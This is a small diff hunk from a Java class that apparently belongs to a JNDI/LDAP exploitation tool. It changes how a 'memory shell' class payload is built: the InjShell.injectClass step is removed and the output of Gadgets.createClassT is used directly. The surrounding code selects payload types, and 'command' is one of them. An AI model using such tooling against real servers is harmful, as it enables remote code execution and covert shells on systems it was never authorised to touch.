@@ -57,8 +57,7 @@ public class TomcatJdbcController implements LdapController {
             if (payloadType.contains("M-")) {
                 String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 InjShell.init(params);
-                Class<?> classQ = Gadgets.createClassT(ClassName1);
-                code = InjShell.injectClass(classQ);
+                code = Gadgets.createClassT(ClassName1);
             }
 
             if (payloadType.contains("command")) {
